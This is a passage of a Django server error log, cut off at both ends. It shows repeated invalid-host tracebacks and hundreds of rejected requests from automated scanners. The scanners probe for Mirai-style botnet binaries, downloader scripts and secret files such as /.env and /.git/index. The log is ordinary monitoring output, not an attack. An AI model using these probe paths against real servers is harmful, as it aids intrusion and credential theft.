    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /index.html
Not Found: /robots.txt
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /bin.sh
Not Found: /i
Not Found: /Mozi.m
Not Found: /Mozi.a
Not Found: /i5
Not Found: /Josho.arm6
Not Found: /Josho.m68k
Not Found: /bot.arm6
Not Found: /bot.ppc
Not Found: /pmips
Not Found: /px86
Not Found: /parm6
Not Found: /parm5
Not Found: /m68k
Not Found: /pmpsl
Not Found: /test
Not Found: /amd64
Not Found: /sh4
Not Found: /parm
Not Found: /pm68k
Not Found: /spc
Not Found: /mips
Not Found: /mips64
Not Found: /Josho.ppc
Not Found: /Josho.mips
Not Found: /aarch64
Not Found: /bot.sh4
Not Found: /powerpc
Not Found: /bot.x86_64
Not Found: /x86
Not Found: /bot.m68k
Not Found: /mipsel
Not Found: /armv7l
Not Found: /bot.arm7
Not Found: /tmips
Not Found: /sora.arm5
Not Found: /debug.dbg
Not Found: /sora.x86_64
Not Found: /i686
Not Found: /Josho.x86
Not Found: /sora.m68k
Not Found: /Josho.arm7
Not Found: /sora.i686
Not Found: /armv5l
Not Found: /Josho.sh4
Not Found: /main_arm7
Not Found: /sora.sh4
Not Found: /arc
Not Found: /main_m68k
Not Found: /sora.arm7
Not Found: /armv4l
Not Found: /main_mips
Not Found: /main_sh4
Not Found: /arm7
Not Found: /sora.ppc
Not Found: /main_x86
Not Found: /x86_64
Not Found: /main_arm6
Not Found: /sora.mpsl
Not Found: /arm
Not Found: /arm5
Not Found: /armv6l
Not Found: /arm6
Not Found: /Josho.arm5
Not Found: /sparc
Not Found: /mpsl
Not Found: /ppc
Not Found: /Josho.mpsl
Not Found: /main_arm5
Not Found: /main_mpsl
Not Found: /main_x86_64
Not Found: /main_ppc
Not Found: /sora.mips
Not Found: /sora.x86
Not Found: /sora.arm6
Not Found: /splmpsl
Not Found: /zerarm5
Not Found: /zerarm7
Not Found: /nabarm
Not Found: /nabarm6
Not Found: /jklm68k
Not Found: /jklarm7
Not Found: /nklarm7
Not Found: /zerm68k
Not Found: /nklarm6
Not Found: /nabspc
Not Found: /zerspc
Not Found: /splarm6
Not Found: /nabmips
Not Found: /jklmips
Not Found: /jklarm6
Not Found: /zerx86
Not Found: /nklx86
Not Found: /zerarm
Not Found: /nklsh4
Not Found: /nklmips
Not Found: /splarm5
Not Found: /dlr.mpsl
Not Found: /jklsh4
Not Found: /dlr.sh4
Not Found: /splx86
Not Found: /splarm
Not Found: /nabarm5
Not Found: /zermips
Not Found: /splsh4
Not Found: /splspc
Not Found: /dlr.arm
Not Found: /nklarm
Not Found: /dlr.spc
Not Found: /nklm68k
Not Found: /zermpsl
Not Found: /nklmpsl
Not Found: /nabarm7
Not Found: /dlr.mips
Not Found: /nklarm5
Not Found: /jklarm5
Not Found: /dlr.arm5
Not Found: /zersh4
Not Found: /nabm68k
Not Found: /dlr.arm6
Not Found: /nabppc
Not Found: /zerppc
Not Found: /nklppc
Not Found: /dlr.ppc
Not Found: /zerarm6
Not Found: /dlr.arm7
Not Found: /jklx86
Not Found: /jklmpsl
Not Found: /nabx86
Not Found: /dlr.m68k
Not Found: /jklppc
Not Found: /splarm7
Not Found: /nabmpsl
Not Found: /nklspc
Not Found: /dlr.x86
Not Found: /splm68k
Not Found: /jklspc
Not Found: /jklarm
Not Found: /nabsh4
Not Found: /splmips
Not Found: /splppc
Not Found: /hidakibest.mpsl
Not Found: /hidakibest.ppc
Not Found: /hidakibest.arm4
Not Found: /hidakibest.sparc
Not Found: /hidakibest.arm5
Not Found: /hidakibest.x86
Not Found: /hidakibest.mips
Not Found: /hidakibest.arm6
Not Found: /hidakibest.arm7
Not Found: /wget.sh
Not Found: /x
Not Found: /cn
Not Found: /zxc.sh
Not Found: /curl.sh
Not Found: /tftp.sh
Not Found: /ftpget.sh
Not Found: /x86_32
Not Found: /byte.arm5
Not Found: /byte.spc
Not Found: /byte.mips
Not Found: /byte.arm7
Not Found: /byte.m68k
Not Found: /byte.mpsl
Not Found: /byte.arm6
Not Found: /byte.arm
Not Found: /byte.ppc
Not Found: /byte.sh4
Not Found: /byte.x86
Not Found: /nshppc
Not Found: /nsharm6
Not Found: /nsharm7
Not Found: /nsharm
Not Found: /nshmpsl
Not Found: /nshmips
Not Found: /gmpsl
Not Found: /nsharm5
Not Found: /nshsh4
Not Found: /harm5
Not Found: /hmips
Not Found: /earm
Not Found: /esh4
Not Found: /earm5
Not Found: /earm7
Not Found: /emips
Not Found: /eppc
Not Found: /empsl
Not Found: /nrarm7
Not Found: /gmips
Not Found: /garm6
Not Found: /garm
Not Found: /garm7
Not Found: /garm5
Not Found: /nrsh4
Not Found: /gppc
Not Found: /nrmips
Not Found: /nrppc
Not Found: /arm4
Not Found: /vqkjf64
Not Found: /main_arm
Not Found: /boatnet.spc
Not Found: /boatnet.sh4
Not Found: /boatnet.ppc
Not Found: /boatnet.arm6
Not Found: /boatnet.m68k
Not Found: /boatnet.arm7
Not Found: /bot.arm5
Not Found: /bot.mpsl
Not Found: /bot.mips
Not Found: /bot.x86
Not Found: /bot.arm
Not Found: /boatnet.mpsl
Not Found: /boatnet.x86
Not Found: /boatnet.mips
Not Found: /boatnet.arm
Not Found: /boatnet.arm5
Not Found: /botnet.mpsl
Not Found: /botnet.sh4
Not Found: /botnet.arm5
Not Found: /botnet.spc
Not Found: /botnet.arm7
Not Found: /botnet.mips
Not Found: /botnet.m68k
Not Found: /botnet.arm6
Not Found: /botnet.x86
Not Found: /yakuza.arm6
Not Found: /jade.arm6
Not Found: /jade.m68k
Not Found: /vwkjebwi686
Not Found: /qkehusl
Not Found: /vkjqpc
Not Found: /vsbeps
Not Found: /wheiuwa4
Not Found: /vqsjh4
Not Found: /dvwkja7
Not Found: /kjsusa6
Not Found: /jade.mpsl
Not Found: /jade.spc
Not Found: /jade.ppc
Not Found: /jade.arm7
Not Found: /jade.sh4
Not Found: /jade.mips
Not Found: /jade.arm
Not Found: /jade.arm5
Not Found: /jade.x86
Not Found: /la.bot.powerpc
Not Found: /arm6.nn
Not Found: /boatnet.arc
Not Found: /sarm6
Not Found: /p-p.c-.Sakura
Not Found: /m-p.s-l.Sakura
Not Found: /la.bot.mips
Not Found: /la.bot.m68k
Not Found: /la.bot.mipsel
Not Found: /la.bot.arm
Not Found: /i486
Not Found: /i586
Not Found: /sarm
Not Found: /m-6.8-k.Sakura
Not Found: /arm7.nn
Not Found: /a-r.m-5.Sakura
Not Found: /la.bot.arm7
Not Found: /sarm7
Not Found: /a-r.m-4.Sakura
Not Found: /m-i.p-s.Sakura
Not Found: /la.bot.sh4
Not Found: /sarm5
Not Found: /x-8.6-.Sakura
Not Found: /a-r.m-6.Sakura
Not Found: /smips
Not Found: /smpsl
Not Found: /x86_32.nn
Not Found: /la.bot.arm5
Not Found: /la.bot.arm6
Not Found: /la.bot.sparc
Not Found: /s-h.4-.Sakura
Not Found: /a-r.m-7.Sakura
Not Found: /i-5.8-6.Sakura
Not Found: /mips.nn
Not Found: /mipsel.nn
Not Found: /arm5.nn
Not Found: /arm.nn
Not Found: /x86_64.nn
Not Found: /mirai.sh4
Not Found: /mirai.arm7
Not Found: /mirai.m68k
Not Found: /mirai.mips
Not Found: /mirai.spc
Not Found: /mirai.arm
Not Found: /mirai.x86
Not Found: /dss
Not Found: /aisuru.mips
Not Found: /586
Not Found: /co
Not Found: /tftp
Not Found: /Demon.i686
Not Found: /Demon.sh4
Not Found: /Demon.arm7
Not Found: /Demon.mpsl
Not Found: /Demon.mips
Not Found: /Demon.x86
Not Found: /Demon.arm6
Not Found: /yakuza.i586
Not Found: /yakuza.x86
Not Found: /yakuza.mips
Not Found: /yakuza.arm4
Not Found: /yakuza.m68k
Not Found: /yakuza.ppc
Not Found: /mirai.mpsl
Not Found: /bins.sh
Not Found: /mirai.ppc
Not Found: /arm61
Not Found: /dc
Not Found: /scar
Not Found: /bin.mipsel
Not Found: /bin.m68k
Not Found: /bin.i586
Not Found: /bin.armv5l
Not Found: /bin.mips
Not Found: /bin.sh4
Not Found: /bin.x86_64
Not Found: /bin.armv4l
Not Found: /bin.armv7l
Not Found: /bin.armv6l
Not Found: /blink
Not Found: /roze.x86
Not Found: /roze.i586
Not Found: /.Sm68k
Not Found: /.Smips
Not Found: /roze.ppc
Not Found: /roze.sh4
Not Found: /roze.m68k
Not Found: /roze.armv4
Not Found: /.Ssh4
Not Found: /roze.mips
Not Found: /roze.armv5
Not Found: /roze.armv6
Not Found: /roze.i686
Not Found: /roze.mipsel
Not Found: /bin.i686
Not Found: /roze.sparc
Not Found: /redtail.x86_64
Not Found: /sora.spc
Not Found: /sora.arm
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.ppc
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.mpsl
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.x86
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.m68k
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.spc
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.mips
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.arm7
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.arm
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.arm5
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.i686
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.sh4
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.arm6
Not Found: /db0fa4b8db0333367e9bda3ab68b8042.arc
Not Found: /earc
Not Found: /ex86
Not Found: /bot.spc
Not Found: /qkbfi86
Not Found: /boatnet.x86_64
Not Found: /boatnet.i686
Not Found: /cron
Not Found: /bash
Not Found: /ntpd
Not Found: /wget
Not Found: /openssh
Not Found: /ftp
Not Found: /apache2
Not Found: /pftp
Not Found: /sshd
Not Found: /sh
Not Found: /t
Not Found: /tarm6
Not Found: /tarm
Not Found: /tsh4
Not Found: /tarm5
Not Found: /tmpsl
Not Found: /tppc
Not Found: /tarm7
Not Found: /tspc
Not Found: /a
Not Found: /bolubotnetm68k
Not Found: /bolubotnetx86
Not Found: /bolubotnetarm5
Not Found: /bolubotnetarm6
Not Found: /bolubotnetarm7
Not Found: /bolubotnetarm
Not Found: /bolubotnetmips
Not Found: /bolubotnetx86_64
Not Found: /bolubotnetmpsl
Not Found: /bolubotnetsh4
Not Found: /bolubotnetppc
Not Found: /.i
Not Found: /nullnet_load.arm
Not Found: /nullnet_load.arm7
Not Found: /i6
Not Found: /runtime
Not Found: /xd.mpsl
Not Found: /xd.arm5
Not Found: /xd.m68k
Not Found: /xd.arm
Not Found: /xd.arm6
Not Found: /xd.mips
Not Found: /xd.sh4
Not Found: /xd.ppc
Not Found: /xd.x86
Not Found: /xd.arm7
Not Found: /rebirth.mips
Not Found: /rebirth.arm6
Not Found: /rebirth.i686
Not Found: /rebirth.arm5
Not Found: /rebirth.m68
Not Found: /rebirth.mpsl
Not Found: /.Sarm
Not Found: /skid.arm6
Not Found: /zte
Not Found: /acmips
Not Found: /acarm7
Not Found: /acarm5
Not Found: /acmipsel
Not Found: /firmware.mips
Not Found: /firmware.mipsel
Not Found: /firmware.x86_64
Not Found: /firmware.armv5l
Not Found: /firmware.armv4l
Not Found: /firmware.arc
Not Found: /firmware.armv6l
Not Found: /firmware.armv7l
Not Found: /firmware.sh4
Not Found: /r
Not Found: /go.sh
Not Found: /.Sppc
Not Found: /.Sarm5
Not Found: /.Smpsl
Not Found: /.Sarm6
Not Found: /.Sarm7
Not Found: /.Sx86_64
Not Found: /.Sspc
Not Found: /.Sx86
Not Found: /sh4.nn
Not Found: /server
Not Found: /fjwwofba5
Not Found: /wriww68k
Not Found: /dwhdbg
Not Found: /x-3.2-.Sakura
Not Found: /goahead
Not Found: /m68k.nn
Not Found: /tel.arm7
Not Found: /tel.arm6
Not Found: /tel.arm
Not Found: /tel.x86
Not Found: /tel.arm5
Not Found: /tel.mpsl
Not Found: /tel.mips
Not Found: /lol
Not Found: /sparc.nn
Not Found: /powerpc.nn
Not Found: /0daympsl
Not Found: /earm6
Not Found: /c.sh
Not Found: /w.sh
Not Found: /b
Not Found: /panax86
Not Found: /jbrute
Not Found: /2023
Not Found: /mig
Not Found: /ps2
Not Found: /fdgsfg
Not Found: /bx
Not Found: /gocl
Not Found: /multi
Not Found: /k.sh
Not Found: /weed
Not Found: /ipc
Not Found: /adb
Not Found: /aaa
Not Found: /z.sh
Not Found: /jaws
Not Found: /zz
Not Found: /fb
Not Found: /f5
Not Found: /mag
Not Found: /av.sh
Not Found: /li
Not Found: /ruck
Not Found: /sd
Not Found: /lll
Not Found: /irz
Not Found: /vc
Not Found: /xaxa
Not Found: /g
Not Found: /toto
Not Found: /asd
Not Found: /test.sh
Not Found: /linksys
Not Found: /hoho.arm
Not Found: /hoho.x86
Not Found: /hoho.sh4
Not Found: /hoho.arm7
Not Found: /hoho.mips
Not Found: /hoho.ppc
Not Found: /hoho.m68k
Not Found: /hoho.arm5
Not Found: /hoho.mpsl
Not Found: /hoho.arm6
Not Found: /Aqua.arm6
Not Found: /Aqua.arm5
Not Found: /Aqua.mips
Not Found: /Aqua.arm7
Not Found: /Aqua.x86
Not Found: /Aqua.mpsl
Not Found: /Aqua.arm4
Not Found: /rebirth.arm4t
Not Found: /386
Not Found: /linux
Not Found: /zmap.mips
Not Found: /zmap.x86_64
Not Found: /zmap.arm7
Not Found: /zmap.x86
Not Found: /zmap.arm6
Not Found: /zmap.spc
Not Found: /zmap.m68k
Not Found: /zmap.arm
Not Found: /zmap.ppc
Not Found: /zmap.mpsl
Not Found: /zmap.arm5
Not Found: /zmap.sh4
Not Found: /custom.spc
Not Found: /updates.mpsl
Not Found: /miraint.arm7
Not Found: /updates.spc
Not Found: /updates.ppc
Not Found: /updates.m68k
Not Found: /updates.sh4
Not Found: /updates.arm6
Not Found: /updates.arm7
Not Found: /updates.arm5
Not Found: /updates.arc
Not Found: /updates.i686
Not Found: /updates.arm
Not Found: /updates.x86
Not Found: /updates.mips
Not Found: /xd.spc
Not Found: /KKveTTgaAAsecNNaaaa.sh4
Not Found: /KKveTTgaAAsecNNaaaa.i686
Not Found: /KKveTTgaAAsecNNaaaa.arm
Not Found: /KKveTTgaAAsecNNaaaa.ppc
Not Found: /KKveTTgaAAsecNNaaaa.mpsl
Not Found: /KKveTTgaAAsecNNaaaa.i486
Not Found: /KKveTTgaAAsecNNaaaa.m68k
Not Found: /KKveTTgaAAsecNNaaaa.x86_64
Not Found: /KKveTTgaAAsecNNaaaa.mips
Not Found: /KKveTTgaAAsecNNaaaa.x86
Not Found: /KKveTTgaAAsecNNaaaa.arm7
Not Found: /KKveTTgaAAsecNNaaaa.spc
Not Found: /KKveTTgaAAsecNNaaaa.arm6
Not Found: /KKveTTgaAAsecNNaaaa.arc
Not Found: /KKveTTgaAAsecNNaaaa.arm5
Not Found: /s
Not Found: /f
Not Found: /darm
Not Found: /darm6
Not Found: /darm5
Not Found: /zte.arm7
Not Found: /tarc
Not Found: /darm7
Not Found: /botnt.mpsl
Not Found: /botnt.arm5
Not Found: /aisuru.arm5
Not Found: /aisuru.arm
Not Found: /botnt.arm7
Not Found: /aisuru.i586
Not Found: /botnt.mips
Not Found: /aisuru.ppc
Not Found: /aisuru.i686
Not Found: /aisuru.arm7
Not Found: /botnt.arm
Not Found: /botnt.armv7v5
Not Found: /aisuru.mpsl
Not Found: /gx86
Not Found: /pov
Not Found: /j
Not Found: /r.sh
Not Found: /h
Not Found: /t.sh
Not Found: /tenda.sh
Not Found: /gg
Not Found: /lil
Not Found: /Aqua.sh4
Not Found: /Aqua.ppc
Not Found: /Aqua.x86_64
Not Found: /Aqua.m68k
Not Found: /skid.mips
Not Found: /c.x86
Not Found: /miraint.mips
Not Found: /aodpash4
Not Found: /dmlsaa5
Not Found: /okgsdbg
Not Found: /vsos68k
Not Found: /vsjsjpc
Not Found: /lkssn686
Not Found: /sngosia7
Not Found: /fosfsa4
Not Found: /kjnfvaa6
Not Found: /Aqua.dbg
Not Found: /Aqua.i686
Not Found: /jafjn64
Not Found: /sjfudps
Not Found: /anfoa86
Not Found: /ysjssl
Not Found: /Aqua.86
Not Found: /firmware.i586
Not Found: /firmware.i686
Not Found: /firmware.powerpc
Not Found: /firmware.m68k
Not Found: /firmware.sparc
Not Found: /c.arm
Not Found: /c.arm6
Not Found: /c.arm7
Not Found: /c.arm5
Not Found: /c.m68k
Not Found: /c.mpsl
Not Found: /c.mips
Not Found: /c.ppc
Not Found: /c.spc
Not Found: /x-8.6-.ISIS
Not Found: /firmware.arm-linux-gnueabihf
Not Found: /create.py
Not Found: /sdt
Not Found: /miraint.spc
Not Found: /miraint.mpsl
Not Found: /miraint.sh4
Not Found: /miraint.m68k
Not Found: /miraint.arm
Not Found: /miraint.ppc
Not Found: /mirai.gnueabihf
Not Found: /miraint.arm5n
Not Found: /mirai.arm5n
Not Found: /best.ppc
Not Found: /best.arm
Not Found: /best.arm4
Not Found: /best.x86
Not Found: /best.arm5
Not Found: /best.mips
Not Found: /best.mpsl
Not Found: /best.arm7
Not Found: /arm5n
Not Found: /aisuru.aarch64
Not Found: /cyber-ppc
Not Found: /cyber-arm4
Not Found: /cyber-arm6
Not Found: /cyber-arm7
Not Found: /cyber-x86
Not Found: /cyber-mips
Not Found: /cyber-arm5
Not Found: /cyber-sh4
Not Found: /cyber-m68k
Not Found: /cyber-mpsl
Not Found: /mirai.armv4l
Not Found: /mirai.bin
Not Found: /mirai.arc
Not Found: /mirai.x86_64
Not Found: /mirai.powerpc
Not Found: /mirai.mipsel
Not Found: /botx.arm6
Not Found: /botx.x86
Not Found: /botx.mips
Not Found: /botx.arm5
Not Found: /botx.m68k
Not Found: /botx.sh4
Not Found: /botx.ppc
Not Found: /botx.mpsl
Not Found: /botx.arm
Not Found: /botx.spc
Not Found: /mirai.i586
Not Found: /mirai.sparc
Not Found: /mirai.i686
Not Found: /skid.mpsl
Not Found: /iUeQQNFZ9vwOLXIBiZ4156FCf1nexMVYnW
Not Found: /lleJwlAImyqhwZhZbB4dwBpBt4quciaLIx
Not Found: /oFcmE1FgKhne42UgV8PwFKEfPr8uhc21Zt
Not Found: /jOjCsc6Lb1rfzqKpKE3ERtlNUMhVHKezYs
Not Found: /iR8yH0i1CmTagbpd5LAkUyKPelq5OSIWoO
Not Found: /gJ6oXExmNUtJlKPCezUadEGTjUqWrrQ4Yt
Not Found: /Vagi7meiueBttLimeY0QohYvyNii9y4zMR
Not Found: /ggIPjWoiO55CN4uLVMsA2oFwFP7Fau1TaI
Not Found: /2qwYcUyrntHY24EcShZNxGEQajLpAzKO5c
Not Found: /BOBYOkW9NldfT5hBXi13puYhvLpwLH5Z4m
Not Found: /2Bs8JFpFOqBiXgfSVDNolN4qmaxmtBrJlm
Not Found: /q24SnZsLiPrkf7mgfxxwiPjZ5o2OXBksEW
Not Found: /6mXYDuVjkYQ1THGXik9a0pAAofy3U2Zedb
Not Found: /G7ulzVjYC59VOtF7T9QRQXEtGjH8ckO0Nx
Not Found: /mirai.arm5l
Not Found: /mirai.arm6l
Not Found: /mirai.arm7l
Not Found: /4GjvJv2WsEeK4KTW0T7MoUu6GFrVlEyqys
Not Found: /2cpQFAm7HV04FsKexa9uMBzKlDGABg5fBT
Not Found: /o1KlQxcBl3RfqQL7zG2YMZChDur2XyW7rZ
Not Found: /zTaBQw506jGO33uhyBoSdNcgv09WUPD8Y8
Not Found: /wbAWQYT0xzzpN2gPgC6tPXwKDAmspSLk3G
Not Found: /rTXnteGnn93dfOstrEOasxXXqGQ2rInU61
Not Found: /gGJIqCld032lUfErvEnt9mwuLIMjt1yOTS
Not Found: /rZ3aQaDA4r95eJhrZbpBjl8FvbP77WccK6
Not Found: /xq4zikwLeks9Xjz1V3aU1JS889foqeBjys
Not Found: /R47OpVdwilbnyY6yCcL0KWNQs1oYCjOuPe
Not Found: /clbvJjUAuql4HKwTEUnbimMOyxEzGr8CX7
Not Found: /bpJncUEIUmAgsWjqraqMMn5GluYkLUoPuW
Not Found: /8vEmyqB6zPykzUL4el08zYwL60DpfB6iNy
Not Found: /caak72W97tDc3EghxgOox2pYD4rZXRr9YX
Not Found: /Ares.arm
Not Found: /Ares.arm7
Not Found: /botx.arm7
Not Found: /noob.mips
Not Found: /noob.x86
Not Found: /noob.armn
Not Found: /noob.arm4
Not Found: /noob.arm7
Not Found: /noob.arm5
Not Found: /noob.ppc
Not Found: /noob.mpsl
Not Found: /curl
Not Found: /o
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /setup.cgi
Not Found: /.git/index
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /sdk
Not Found: /odinhttpcall1739765982
Not Found: /evox/about
Not Found: /HNAP1
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /v2/_catalog
Not Found: /cgi-bin/authLogin.cgi
Not Found: /query
Not Found: /solr/admin/info/system
Not Found: /solr/admin/cores
Not Found: /.env
Not Found: /robots.txt
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Bad Request: /nmaplowercheck1739769271
Bad Request: /sdk
Invalid HTTP_HOST header: 'broadband.multicitypk.com'. You may need to add 'broadband.multicitypk.com' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
